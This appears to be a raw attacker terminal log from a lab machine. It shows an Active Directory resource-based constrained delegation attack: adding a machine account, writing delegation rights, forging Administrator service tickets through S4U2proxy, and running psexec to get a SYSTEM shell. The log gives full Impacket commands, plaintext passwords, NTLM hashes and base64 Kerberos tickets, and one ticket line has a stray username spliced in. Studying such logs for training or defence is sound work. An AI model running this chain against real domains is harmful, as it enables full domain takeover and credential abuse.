      MSTu2t3Sd5yI8B9zxs2lR4cKm0xuA4XhyNdigvhufdxgVvx4sIOm+lUJmYTyYf2Lc8XMMS+4Qx07l5dr
      aFnQQRcnqT2BHb1wLLn57nQtfzRqmEM3t3Vtu5zBvPWxIgpgmci8zKCjRF07CT2BUQ85Beaz4DOOM9zi
      0aJesbE/zEXupno9ALhHJkmAersiPmTGgUfNk2sJvDT/a7ceBVetyB35H6rdwwYF6O489Kx0sY/TON5X
      BgS3uu3pr5KDZSc4DI2gsmnfAe6OQGJjD/IJokQtXV4I2hV9N0xcajQi10fOHRnfEmKRV2sfD6y8glld
      X9mWpkyceivvDEHv2kYbwf2YKHhhjr310EV4wER5L4QFIspHDLTSYKlSnEtHwk0aKSGePT2HmvjJDcJk
      NwPOXbQ+mF1MCIr+y3yjgdMwgdCgAwIBAKKByASBxX2BwjCBv6CBvDCBuTCBtqAbMBmgAwIBF6ESBBDz
      HEp/Z+5Nm9/M3TYfJ6pgoREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0
      b3KjBwMFAEChAAClERgPMjAyNjA4MDUwOTQ2MzNaphEYDzIwMjYwODA1MTk0NjMzWqcRGA8yMDI2MDgx
      MjA5NDYzM1qoERsPUkVTT1VSQ0VELkxPQ0FMqRMwEaADAgEBoQowCBsGbXlzeXMk

[*] Impersonating user 'Administrator' to target SPN 'cifs/ResourceDC.resourced.local'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Building S4U2proxy request for service: 'cifs/ResourceDC.resourced.local'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/ResourceDC.resourced.local':

      doIGiDCCBoSgAwIBBaEDAgEWooIFhjCCBYJhggV+MIIFeqADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIt
      MCugAwIBAqEkMCIbBGNpZnMbGlJlc291cmNlREMucmVzb3VyY2VkLmxvY2Fso4IFLzCCBSugAwIBEqED
      AgEHooIFHQSCBRn3wJR4SB64lgedR8w6iOJGXsHpWcqsQPCOdtsbVh/zoZKKHLRm4yPSXAsPXJeL2Oao
      k4nVtJonxzcDK0wqBA9mkqVj8UkqiAj+7Bp7DuMnta1RgiKV8U3FDkMDL5Uuz0e34Ok9lpsKkaxvldQY
      cRJKlFAXD42Br51zB5MsgeMHe5dsZep12Y9q7LWqp/vyvAQok//+W8rWBPzsxJiPkVo3KKn+1i3WiApS
      zQkuEMx2JB62pIh8ZmKaAR5/rWz4VZvmCzhzxoCHluiUfZdPhXTE6QYcDeBmHKIYdOziBL5xn9xTiO7y
      wqgnFb3t32zSQc1bzgd97JG1fB33UgoD4jrJPdADX1CaT23QYQuSCD8AWvLaNhkwFcAWcKVASAKljXbO
      dUVS3yyiczwTKUYwHZmz6+3+IpnWvBms0Luxy5Gz7vuWrnxIGSz1DvSD0wimFo+7pWudqGuyIAh37bhU
      CROCqqoD9K7ase3dmsM4tdK7HYs6UXM9gB2shrTjLP3J0mjE3FuLPIVDu6zR5+3syT9VzDK43FX/pt+U
      GziYqI8PBG3+ZdVrSGbyiu6dbOS1AuY7RRnjrWYX43QydWtRBupEg6jiyAI4JcuS61/QoPEespGwieIN
      NQIfWuiLeYZXSPtfxJXsxULq64XEuBM+Tg3oXnNH4YteMq11bHljFqvGRJpDcf+qpFjZE+zF3Np7YXnb
      3zQGMraC4ak8w0WY4yREtNcPU6m/+PGm+VlP1dhMv/Nne3G5jjpwR6Z//ZMixAY5ilXqasi/GpNQU0Z+
      PMcUrx5dkEvo9ytXcs9b0mVJWMR+CinfNo78yM0hGStTPmrqgRCFW5W0HUIaIIi3WCZS2SW2qQMHi5YI
      RYuYtiaT8RA26wSGfSH0vVTvhjKvbvqQZRJDWxmBysnQmNDaz0OJUkAmMVTOvgJPWrIr0hTUw+yQfBEHL.Livingstone
      PSwc5JMIuZnUDmhmcCKmqV/cXwc9cWVkASPJX2Afbglut/XXtMxv26jawnxAn/qinxAe6zxDzJfxh72d
      rEEuqT9hFFn8f+0M3YcUBvD5rA36EPgrrJ34S28Q0OAdjG/jkvIUjmETyGO1BHGTlRWnUp6G/XPYltqS
      MXALdDjBw/3fagE1ISUu9zvUtQSRdJiG6fExfJ/NuCNVGhUKB9t9KEB2dkeb6PSuyjfbvvjI3dWSDLLh
      gn7dxsdAgKqj13Us1BOuErWkNPotHXTK0rkjPA+i5oNww+CzA72YOWeXJZImn/pEYCvQQaIjZvbzjbsR
      /oH7dFnxuebtyIyxGBstKmDKdJz7m2X8OZJM6OLmrM0/2Evu7tLpFecCQBqrf+IDQdxaNGV9JFhVH7dv
      b/MEP6DlW6ha9Ug1bQYS/eQA5qLWNGrE/qZ7Np1WaoDjhzHGOz9/gn3rp8NwMHZuezfWc+YY9DQp4NDZ
      N8OKrU4cwAN015FDxDJWr4z4ApUV1PuePDQfzl7PEKKPTRH2apIkZ43EE/BwMInMGW+4u+Ilge52zkU7
      4bfi3h5X1kjLUjL/OJ+BrueE18kExZgojTxKmqbBZo3xGQilhtSSOi319qg/H6SswBPF/YIfW3NdSxxN
      asVkGASXIRBQn2qLr0zlAokJNOTOLpUtBfI3gMzWz3Thai9l6GI+tZMC1qDsrh1nn1uDZDgvdGrzqcUp
      0pBmCSdAb1q8DfS2I2CJKavuVpDlfL6PgxX0bs1hPSuusIPxXBL1vvZ2As91R3PKXGmLSy8nfkmjge0w
      geqgAwIBAKKB4gSB332B3DCB2aCB1jCB0zCB0KAbMBmgAwIBEaESBBBOMCZ9CD1k2WbKvMIwtwfIoREb
      D1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAy
      NjA4MDUwOTQ2MzNaphEYDzIwMjYwODA1MTk0NjMzWqcRGA8yMDI2MDgxMjA5NDYzM1qoERsPUkVTT1VS
      Q0VELkxPQ0FMqS0wK6ADAgECoSQwIhsEY2lmcxsaUmVzb3VyY2VEQy5yZXNvdXJjZWQubG9jYWw=
[+] Ticket successfully imported!

└─$ evil-winrm -i resourced.local -u Administrator -p 'QWEqwe123!'

*Evil-WinRM* PS C:\Users\Administrator> klist

Current LogonId is 0:0xa7fe5

Cached Tickets: (1)

#0>	Client: Administrator @ RESOURCED.LOCAL
	Server: cifs/ResourceDC.resourced.local @ RESOURCED.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 8/5/2026 3:01:11 (local)
	End Time:   8/5/2026 13:01:10 (local)
	Renew Time: 8/12/2026 3:01:10 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0
	Kdc Called:


*Evil-WinRM* PS C:\Users\L.Livingstone\documents> download ticket_cifs_ResourceDC.resourced.local.kirbi


└─$ impacket-ticketConverter ticket_cifs_ResourceDC.resourced.local.kirbi ticket.ccache

└─$ export KRB5CCNAME=$(pwd)/ticket.ccache

└─$ impacket-psexec -k -no-pass RESOURCED.LOCAL/Administrator@ResourceDC.resourced.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on ResourceDC.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file FTYdpaqL.exe
[*] Opening SVCManager on ResourceDC.resourced.local.....
[*] Creating service eHpC on ResourceDC.resourced.local.....
[*] Starting service eHpC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system



└─$ impacket-addcomputer  -method SAMR  -computer-name 'mysys$' -computer-pass 'QWEqwe123!' -dc-ip 192.168.198.175  'resourced.local/V.Ventz:HotelCalifornia194!' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account mysys$ with password QWEqwe123!.


we can also use hash to do this,

└─$ impacket-addcomputer  -method SAMR  -computer-name 'mysys$' -computer-pass 'QWEqwe123!' -dc-ip 192.168.198.175 -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Account mysys$ already exists! If you just want to set a password, use -no-add.

└─$ netexec ldap 192.168.198.175 -u V.Ventz -p 'HotelCalifornia194!' --computers
[*] Initializing LDAP protocol database
LDAP        192.168.198.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.198.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
LDAP        192.168.198.175 389    RESOURCEDC       [*] Total records returned: 2
LDAP        192.168.198.175 389    RESOURCEDC       RESOURCEDC$
LDAP        192.168.198.175 389    RESOURCEDC       mysys$


└─$ impacket-rbcd -delegate-from 'mysys$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/L.Livingstone' -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] mysys$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     mysys$       (S-1-5-21-537427935-490066102-1511301751-4101)

└─$ impacket-getST -spn 'cifs/RESOURCEDC.resourced.local' -impersonate 'Administrator' 'resourced.local/mysys$:QWEqwe123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache

┌──(ed㉿kali)-[/tmp]
└─$ ls
20260804113019_computers.json
20260804113019_containers.json
20260804113019_domains.json
20260804113019_gpos.json
20260804113019_groups.json
20260804113019_ous.json
20260804113019_users.json
20260804113340_bloodhound.zip
Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache

└─$ export KRB5CCNAME=/tmp/Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache 










